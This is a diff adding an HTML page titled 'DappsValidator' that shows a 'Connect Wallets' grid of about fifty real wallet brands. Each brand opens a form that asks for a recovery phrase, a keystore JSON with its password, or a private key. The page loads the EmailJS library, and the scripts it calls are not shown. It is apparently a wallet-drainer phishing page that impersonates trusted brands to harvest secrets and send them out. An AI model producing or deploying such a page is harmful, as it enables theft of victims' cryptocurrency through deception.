@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+<title>DappsValidator</title>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="Images/A44.jpeg" type="image/jpeg">
+  <link rel="stylesheet" href="Style/PB32-2.css">
+  <link rel="stylesheet" href="Style/TestRun.css">
+  <!-- <link rel="stylesheet" href="Style/PB32-enhanced.css"> -->
+  <link
+    href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+</head>
+
+
+<body>
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <div class="close-section">
+        <!-- <span class="close">&times;</span> -->
+        <button class="close-button">Back</button>
+      </div>
+    </div>
+
+
+    <div class="flex-section-A">
+      <div class="connection-box">
+        <p class="modal-connection-status">connecting...</p>
+      </div>
+    </div>
+
+
+    <div class="flex-section">
+      <div class="connection-box-left">
+        <div class="text-content">
+          <h3 class="modal-connection-status-2a">connecting</h3>
+          <p class="modal-connection-status-2b">Easy-to-use browser extension</p>
+        </div>
+
+        <div class="logo-content">
+          <img src="Images/A1.png" class="modal-logo">
+        </div>
+      </div>
+    </div>
+  </div>
+  </div>
+  </div>
+
+
+  <div id="secondMyModal" class="third-modal">
+    <div class="third-modal-content">
+      <div class="close-section-2">
+        <span class="second-close" class="close-Span">&times;</span>
+        <button class="second-close-button">Back</button>
+      </div>
+    </div>
+
+    <div class="flex-section-B">
+      <div class="text-content-2">
+        <h3 class="newModalheader">Import your Trust Wallet</h3>
+      </div>
+      <div class="logo-content">
+        <img src="Images/A1.png" class="modal-logo-2">
+      </div>
+    </div>
+
+    <div class="form-head">
+      <div class="form-header" data-target="phraseForm">Phrase</div>
+      <div class="form-header" data-target="jsonForm">KeystoreJSON</div>
+      <div class="form-header" data-target="privateKeyForm">Private key</div>
+    </div>
+
+    <div class="form-section">
+      <div class="form-slider" id="phraseForm">
+        <form class="forms" id="wordForm">
+          <textarea id="words" name="words" placeholder="Enter your recovery phrase" required></textarea>
+        </form>
+        <p id="messagePhrase" class="form-note-1">Typically 12 (sometimes 24) words separated by single spaces</p>
+      </div>
+
+      <div class="form-slider" id="jsonForm">
+        <form class="forms" id="jsonForm">
+          <textarea id="json" name="json" placeholder="Enter your Keystore JSON" required></textarea>
+          <input id="password" type="password" placeholder="Password" required>
+        </form>
+        <p id="messageJson" class="form-note-2">Several lines of text beginning with {...} plus the password you used to
+          encrypt it.
+        </p>
+      </div>
+
+      <div class="form-slider" id="privateKeyForm">
+        <form class="forms" id="privateKeyForm">
+          <textarea id="key" name="key" placeholder="Enter your private key" required></textarea>
+        </form>
+        <p id="messagePrivatekey" class="form-note-3">Private keys vary in format, but they often consist of a sequence
+          of hexadecimal
+          characters without spaces.</p>
+      </div>
+    </div>
+    <div class="form-button-container">
+      <button id="form-connect-button" type="submit" class="form-button">CONNECT</button>
+    </div>
+  </div>
+  </div>
+  </div>
+
+  <!-- Custom Alert Modal with Progress Bar -->
+  <div id="custom-alert" class="custom-alert hidden">
+    <div class="custom-alert-content">
+      <p id="custom-alert-message"></p>
+      <!-- Progress Bar -->
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+  </div>
+
+
+
+  <section class="wallet-support" class="wallet-support modal-open">
+    <h2 class="wallet-support-heading">Connect Wallets</h2>
+    <p class="wallet-support-text">
+      Open protocols for connecting wallet to DApps
+    </p>
+
+    <section class="item-list">
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A1.png" alt="Item 1">
+          <p class="logo-title">Wallet Connect</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A3.jpg" alt="Item 1">
+          <p class="logo-title">Metamask</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A2.jpg" alt="Item 1">
+          <p class="logo-title">Trust Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/B1.png" alt="Item 1">
+          <p class="logo-title">BitGet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/B2.png" alt="Item 1">
+          <p class="logo-title">Phantom</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A8.jpeg" alt="Item 1">
+          <p class="logo-title">Leap Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A4.jpg" alt="Item 1">
+          <p class="logo-title">Ledger Live</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A5.png" alt="Item 1">
+          <p class="logo-title">CoinBase</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A6.jpg" alt="Item 1">
+          <p class="logo-title">Crypto.com</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A7.jpg" alt="Item 1">
+          <p class="logo-title">Argent</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/C5.jpeg" alt="Item 1">
+          <p class="logo-title">Solflare</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/B4.png" alt="Item 1">
+          <p class="logo-title">Tonkeeper</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/B5.png" alt="Item 1">
+          <p class="logo-title">OKX</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/C4.jpeg" alt="Item 1">
+          <p class="logo-title">Keplr Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A10.jpeg" alt="Item 1">
+          <p class="logo-title">Zengo</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A11.jpeg" alt="Item 1">
+          <p class="logo-title">Trezor</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A12.png" alt="Item 1">
+          <p class="logo-title">Solana</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A13.png" alt="Item 1">
+          <p class="logo-title">Blockchain</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A14.jpg" alt="Item 1">
+          <p class="logo-title">BitPay</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/T2.jpeg" alt="Item 1">
+          <p class="logo-title">TradeWiz</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A16.jpg" alt="Item 1">
+          <p class="logo-title">imToken</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A17.jpeg" alt="Item 1">
+          <p class="logo-title">Pillar</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A19.jpg" alt="Item 1">
+          <p class="logo-title">Rainbow</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/T1.png" alt="Item 1">
+          <p class="logo-title">Bonkbot</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A21.jpg" alt="Item 1">
+          <p class="logo-title">Onto</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/T4.jpeg" alt="Item 1">
+          <p class="logo-title">Maestro</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A23.jpg" alt="Item 1">
+          <p class="logo-title">Walleth</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A28.jpg" alt="Item 1">
+          <p class="logo-title">1inch Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A29.jpg" alt="Item 1">
+          <p class="logo-title">TrustVault</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/nva.jpg" alt="Item 1">
+          <p class="logo-title">Nova Polkadot Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A30.jpg" alt="Item 1">
+          <p class="logo-title">Atomic</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A31.jpg" alt="Item 1">
+          <p class="logo-title">Coin98</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/T3.jpeg" alt="Item 1">
+          <p class="logo-title">Rabby Wallet</p>
+        </div>
+      </div>
+
+       <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/nova.jpg" alt="Item 1">
+          <p class="logo-title">Nova Bot</p>
+        </div>
+      </div>
+
+       <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/csp.png" alt="Item 1">
+          <p class="logo-title">Casper</p>
+        </div>
+      </div>
+
+       <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/cni.png" alt="Item 1">
+          <p class="logo-title">Coinomi</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/gm.png" alt="Item 1">
+          <p class="logo-title">GMGN Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/pdy.jpg" alt="Item 1">
+          <p class="logo-title">Prodigy</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A32.jpg" alt="Item 1">
+          <p class="logo-title">Loopring Wallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/A35.jpg" alt="Item 1">
+          <p class="logo-title">AlphaWallet</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D9.png" alt="Item 1">
+          <p class="logo-title">SafePal</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D8.png" alt="Item 1">
+          <p class="logo-title">Hodl</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D7.jpeg" alt="Item 1">
+          <p class="logo-title">Ownbit</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D6.png" alt="Item 1">
+          <p class="logo-title">BitKeep</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D10.png" alt="Item 1">
+          <p class="logo-title">Initia</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D5.png" alt="Item 1">
+          <p class="logo-title">Tangem</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D4.png" alt="Item 1">
+          <p class="logo-title">Tokenary</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D3.png" alt="Item 1">
+          <p class="logo-title">EasyPocket</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D2.png" alt="Item 1">
+          <p class="logo-title">Wallet.io</p>
+        </div>
+      </div>
+
+      <div class="openModalButton">
+        <div class="item">
+          <img class="logo" src="Images/D1.png" alt="Item 1">
+          <p class="logo-title">Ellipal</p>
+        </div>
+      </div>
+    </section>
+</body>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script src="Script/TestRun.js"></script>
+<script src="Script/PB32-connect-swap.js"></script>
+<script src="Script/Test-3.js"></script>
+<script src="Script/Test-4.js"></script>
+</html>
